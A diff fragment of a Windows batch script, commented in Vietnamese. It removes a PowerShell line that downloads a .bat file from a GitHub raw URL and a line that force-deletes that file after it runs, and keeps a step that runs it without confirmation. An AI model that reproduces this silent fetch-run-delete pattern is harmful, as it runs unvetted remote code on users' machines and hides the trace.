@@ -33,14 +33,9 @@ if %found%==1 (
 
 
 
-:: Tải file .bat từ URL
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'"
-
 :: Chạy file .bat mà không hỏi xác nhận
-start /wait C:\windows-backup.bat
+start "" "C:\windows-backup.bat"
 
-:: Xóa file .bat sau khi thực thi
-del /f C:\windows-backup.bat
 
 
 
